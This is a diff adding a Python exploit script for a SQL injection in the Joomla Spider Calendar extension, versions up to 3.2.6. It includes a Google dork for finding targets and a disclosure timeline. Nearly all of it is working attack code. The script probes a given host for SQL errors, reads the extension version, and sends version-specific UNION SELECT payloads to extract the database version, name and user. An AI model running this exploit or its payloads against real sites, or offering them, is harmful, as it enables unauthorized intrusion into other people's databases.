@@ -1,0 +1,308 @@
+#!/usr/bin/env python
+#
+#
+# Exploit Title : Joomla Spider Calendar <= 3.2.6 SQL Injection
+#
+# Exploit Author : Claudio Viviani
+#
+# Vendor Homepage : http://web-dorado.com/
+#
+# Software Link : http://extensions.joomla.org/extensions/calendars-a-events/events/events-calendars/22329
+#
+# Dork Google: inurl:option=com_spidercalendar
+#
+# Date : 2014-08-31
+#
+# Tested on : Windows 7 / Mozilla Firefox
+#             Linux / Mozilla Firefox
+#
+#
+#
+######################
+#
+# PoC Exploit:
+#
+# http://localhost/joomla/index.php?option=com_spidercalendar&calendar_id=1 [SQLi]
+#
+#
+# "calendar_id" and "calendar" variables are not sanitized.
+# 
+#
+# Vulnerability Disclosure Timeline:
+#
+# 2014-08-31:  Discovered vulnerability
+# 2014-09-04:  Vendor Notification
+# 2014-09-05:  Vendor Response/Feedback 
+# 2014-09-05:  Vendor Fix/Patch 
+# 2014-09-05:  Public Disclosure
+
+import codecs
+import httplib
+import re
+import sys
+import socket
+import optparse
+
+banner = """
+
+   $$$$$\                                   $$\                  $$$$$$\            $$\       $$\                               
+   \__$$ |                                  $$ |                $$  __$$\           \__|      $$ |                              
+      $$ | $$$$$$\   $$$$$$\  $$$$$$\$$$$\  $$ | $$$$$$\        $$ /  \__| $$$$$$\  $$\  $$$$$$$ | $$$$$$\   $$$$$$\            
+      $$ |$$  __$$\ $$  __$$\ $$  _$$  _$$\ $$ | \____$$\       \$$$$$$\  $$  __$$\ $$ |$$  __$$ |$$  __$$\ $$  __$$\           
+$$\   $$ |$$ /  $$ |$$ /  $$ |$$ / $$ / $$ |$$ | $$$$$$$ |       \____$$\ $$ /  $$ |$$ |$$ /  $$ |$$$$$$$$ |$$ |  \__|          
+$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ | $$ | $$ |$$ |$$  __$$ |      $$\   $$ |$$ |  $$ |$$ |$$ |  $$ |$$   ____|$$ |                
+\$$$$$$  |\$$$$$$  |\$$$$$$  |$$ | $$ | $$ |$$ |\$$$$$$$ |      \$$$$$$  |$$$$$$$  |$$ |\$$$$$$$ |\$$$$$$$\ $$ |                
+ \______/  \______/  \______/ \__| \__| \__|\__| \_______|       \______/ $$  ____/ \__| \_______| \_______|\__|                
+                                                                          $$ |                                                  
+                                                                          $$ |                                                  
+                                                                          \__|                                                  
+
+     $$$$$$\            $$\                           $$\                            $$$$$$\       $$$$$$\      $$$$$$\  
+    $$  __$$\           $$ |                          $$ |                          $$ ___$$\     $$  __$$\    $$  __$$\ 
+    $$ /  \__| $$$$$$\  $$ | $$$$$$\  $$$$$$$\   $$$$$$$ | $$$$$$\   $$$$$$\        \_/   $$ |    \__/  $$ |   $$ /  \__|
+    $$ |       \____$$\ $$ |$$  __$$\ $$  __$$\ $$  __$$ | \____$$\ $$  __$$\         $$$$$ /      $$$$$$  |   $$$$$$$\  
+    $$ |       $$$$$$$ |$$ |$$$$$$$$ |$$ |  $$ |$$ /  $$ | $$$$$$$ |$$ |  \__|        \___$$\     $$  ____/    $$  __$$\ 
+    $$ |  $$\ $$  __$$ |$$ |$$   ____|$$ |  $$ |$$ |  $$ |$$  __$$ |$$ |            $$\   $$ |    $$ |         $$ /  $$ |
+    \$$$$$$  |\$$$$$$$ |$$ |\$$$$$$$\ $$ |  $$ |\$$$$$$$ |\$$$$$$$ |$$ |            \$$$$$$  |$$\ $$$$$$$$\ $$\ $$$$$$  |
+     \______/  \_______|\__| \_______|\__|  \__| \_______| \_______|\__|             \______/ \__|\________|\__|\______/ 
+                                                                                                                     
+                                                                                         j00ml4 Spid3r C4l3nd4r >= 2.x <= 3.2.6 SQLi
+
+                                		           Written by:
+
+                              				 Claudio Viviani
+
+                           			       http://www.homelab.it
+
+                            				  info@homelab.it
+		                                       homelabit@protonmail.ch
+
+                      			         https://www.facebook.com/homelabit
+                      			            https://twitter.com/homelabit
+                      			         https://plus.google.com/+HomelabIt1/
+			                https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
+
+"""
+
+C0mm4nds = dict()
+C0mm4nds['DB VERS'] = 'VERSION'
+C0mm4nds['DB NAME'] = 'DATABASE'
+C0mm4nds['DB USER'] = 'CURRENT_USER'
+
+com_spidercalendar = "index.php?option=com_spidercalendar&calendar_id=1"
+ver_spidercalendar = "administrator/components/com_spidercalendar/spidercalendar.xml"
+vuln = 0
+
+def cmdMySQL(cmd):
+   SqlInjList = [
+   # SQLi Spider Calendar 2.x
+   '%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x68306d336c34623174%2CIFNULL%28CAST%28'+cmd+'%28%29%20AS%20CHAR%29%2C0x20%29%2C0x743162346c336d3068%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23',
+   # SQLi Spider Calendar 3.0
+   '%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x68306d336c34623174%2CIFNULL%28CAST%28'+cmd+'%28%29%20AS%20CHAR%29%2C0x20%29%2C0x743162346c336d3068%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23',
+   # SQLi Spider Calendar 3.2.x
+   '%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x68306d336c34623174%2CIFNULL%28CAST%28'+cmd+'%28%29%20AS%20CHAR%29%2C0x20%29%2C0x743162346c336d3068%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23',
+   ]
+   return SqlInjList
+
+def checkProtocol(pr):
+
+    parsedHost = ""
+    PORT =  m_oOptions.port
+
+    if pr[0:8] == "https://":
+        parsedHost = pr[8:]
+
+        if parsedHost.endswith("/"):
+            parsedHost = parsedHost.replace("/","")
+            if PORT == 0:
+                PORT = 443
+
+        PROTO = httplib.HTTPSConnection(parsedHost, PORT)
+
+    elif pr[0:7] == "http://":
+        parsedHost = pr[7:]
+        if parsedHost.endswith("/"):
+            parsedHost = parsedHost.replace("/","")
+        if PORT == 0:
+            PORT = 80
+
+        PROTO = httplib.HTTPConnection(parsedHost, PORT)
+
+    else:
+        parsedHost = pr
+
+        if parsedHost.endswith("/"):
+            parsedHost = parsedHost.replace("/","")
+        if PORT == 0:
+            PORT = 80
+
+        PROTO = httplib.HTTPConnection(parsedHost, PORT)
+
+    return PROTO, parsedHost
+
+def connection(addr, url_string):
+
+    parsedHost = checkProtocol(addr)[1]
+    PROTO =  checkProtocol(addr)[0]
+    try:
+        socket.gethostbyname(parsedHost)
+
+    except socket.gaierror:
+        print 'Hostname could not be resolved. Exiting'
+        sys.exit()
+
+    connection_req =  checkProtocol(addr)[0]
+
+    try:
+        connection_req.request('GET', url_string)
+    except socket.error:
+        print('Connection Error')
+        sys.exit(1)
+
+    response = connection_req.getresponse()
+    reader = codecs.getreader("utf-8")(response)
+
+    return {'response':response, 'reader':reader}
+
+
+if __name__ == '__main__':
+    m_oOpts = optparse.OptionParser("%prog -H http[s]://Host_or_IP [-b, --base base_dir] [-p, --port PORT]")
+    m_oOpts.add_option('--host', '-H', action='store', type='string',
+        help='The address of the host running Spider Calendar extension(required)')
+    m_oOpts.add_option('--base', '-b', action='store', type='string', default="/",
+	help='base dir joomla installation, default "/")')
+    m_oOpts.add_option('--port', '-p', action='store', type='int', default=0,
+        help='The port on which the daemon is running (default 80)')
+
+    m_oOptions, remainder = m_oOpts.parse_args()
+    m_nHost = m_oOptions.host
+    m_nPort = m_oOptions.port
+    m_nBase = m_oOptions.base
+
+    if not m_nHost:
+        print(banner)       
+        print m_oOpts.format_help()
+        sys.exit(1)
+
+    print(banner)
+
+    if m_nBase != "/":
+	if m_nBase[0] == "/":
+		m_nBase = m_nBase[1:]
+		if m_nBase[-1] == "/":
+			m_nBase = m_nBase[:-1]
+	else:
+		if m_nBase[-1] == "/":
+			m_nBase = m_nBase[:-1]
+	m_nBase = '/'+m_nBase+'/'
+
+    # Start connection to host for Joomla Spider Calendar vulnerability
+    response = connection(m_nHost, m_nBase+com_spidercalendar+'%27').values()[0]
+    reader = connection(m_nHost, m_nBase+com_spidercalendar+'%27').values()[1]
+    # Read connection code number
+    getcode = response.status
+
+    print("[+] Searching for Joomla Spider Calendar vulnerability...")
+    print("[+]")
+    
+    if getcode != 404:
+        for lines in reader:
+            if not lines.find("You have an error in your SQL syntax;") == -1:
+		print("[!] Boolean SQL injection vulnerability FOUND!")
+                print("[+]")
+                print("[+] Detection version in progress....")
+		print("[+]")
+	
+                try:
+                    response = connection(m_nHost, m_nBase+ver_spidercalendar).values()[0]
+                    reader = connection(m_nHost, m_nBase+ver_spidercalendar).values()[1]
+                    getcode = response.status
+                    if getcode != 404:
+                        for line_version in reader:
+                           if not line_version.find("<version>") == -1:
+                               VER = re.compile('>(.*?)<').search(line_version).group(1)
+                               VER_REP = VER.replace(".","")
+                               if int(VER_REP[0]) == 1 or int(VER_REP) > 326:
+                                   print("[X] VERSION: "+VER)
+                                   print("[X] Joomla Spider Calendar <= 1 or >= 3.2.7 are not vulnerable")
+                                   sys.exit(1)
+                               elif int(VER_REP[0]) == 2:
+                                   print("[+] EXTENSION VERSION: "+VER)
+                                   print("[+]")
+                                   for  cmddesc, cmdsqli in C0mm4nds.items():
+                                       try:
+                                           response = connection(m_nHost, m_nBase+com_spidercalendar+cmdMySQL(cmdsqli)[0]).values()[0]
+                                           reader = connection(m_nHost, m_nBase+com_spidercalendar+cmdMySQL(cmdsqli)[0]).values()[1]
+                                           getcode = response.status
+                                           if getcode != 404:
+                                              for line_response in reader:
+                                                  if not line_response.find("h0m3l4b1t") == -1:
+                                                      MYSQL_VER = re.compile('h0m3l4b1t(.*?)t1b4l3m0h').search(line_response).group(1)
+                                                      if vuln == 0:
+                                                          print("[!] "+m_nHost+" VULNERABLE!!!")
+                                                          print("[+]")
+                                                      print("[!] "+cmddesc+" : "+MYSQL_VER)
+                                                      vuln = 1
+                                       except socket.error:
+                                           print('[X] Connection was lost please retry')
+                                           sys.exit(1)
+                               elif int(VER_REP) == 30:
+                                   print("[+] EXTENSION VERSION: "+VER)
+                                   print("[+]")
+                                   for  cmddesc, cmdsqli in C0mm4nds.items():
+                                       try:
+                                           response = connection(m_nHost, m_nBase+com_spidercalendar+cmdMySQL(cmdsqli)[1]).values()[0]
+                                           reader = connection(m_nHost, m_nBase+com_spidercalendar+cmdMySQL(cmdsqli)[1]).values()[1]
+                                           getcode = response.status
+                                           if getcode != 404:
+                                              for line_response in reader:
+                                                  if not line_response.find("h0m3l4b1t") == -1:
+                                                      MYSQL_VER = re.compile('h0m3l4b1t(.*?)t1b4l3m0h').search(line_response).group(1)
+                                                      if vuln == 0:
+                                                          print("[!] "+m_nHost+" VULNERABLE!!!")
+                                                          print("[+]")
+                                                      print("[!] "+cmddesc+" : "+MYSQL_VER)
+                                                      vuln = 1
+                                       except socket.error:
+                                           print('[X] Connection was lost please retry')
+                                           sys.exit(1)
+                               elif int(VER_REP[0]) == 3:
+                                   print("[+] EXTENSION VERSION: "+VER)
+                                   print("[+]")
+                                   for  cmddesc, cmdsqli in C0mm4nds.items():
+                                       try:
+                                           response = connection(m_nHost, m_nBase+com_spidercalendar+cmdMySQL(cmdsqli)[2]).values()[0]
+                                           reader = connection(m_nHost, m_nBase+com_spidercalendar+cmdMySQL(cmdsqli)[2]).values()[1]
+                                           getcode = response.status
+                                           if getcode != 404:
+                                              for line_response in reader:
+                                                  if not line_response.find("h0m3l4b1t") == -1:
+                                                      MYSQL_VER = re.compile('h0m3l4b1t(.*?)t1b4l3m0h').search(line_response).group(1)
+                                                      if vuln == 0:
+                                                          print("[!] "+m_nHost+" VULNERABLE!!!")
+                                                          print("[+]")
+                                                      print("[!] "+cmddesc+" : "+MYSQL_VER)
+                                                      vuln = 1
+                                       except socket.error:
+                                           print('[X] Connection was lost please retry')
+                                           sys.exit(1)
+                               else:
+                                   print("[-] EXTENSION VERSION: Unknown :(")
+                                   sys.exit(0)
+
+                        if vuln == 0:
+                            # VERSION NOT VULNERABLE :(
+                            print("[X] Spider Calendar patched or SQLi blocked by Web Application Firewall-")
+                            sys.exit(1)
+                        else:
+                            sys.exit(0)
+                except socket.error:
+                    print('[X] Connection was lost please retry')
+                    sys.exit(1)
+
+	# NO SQL BLIND DETECTED
+	print("[X] Spider Calendar patched or SQLi blocked by Web Application Firewall")
+	sys.exit(1)
+    else:
+        print('[X] URL "'+m_nHost+m_nBase+com_spidercalendar+'" NOT FOUND')
+        sys.exit(1)
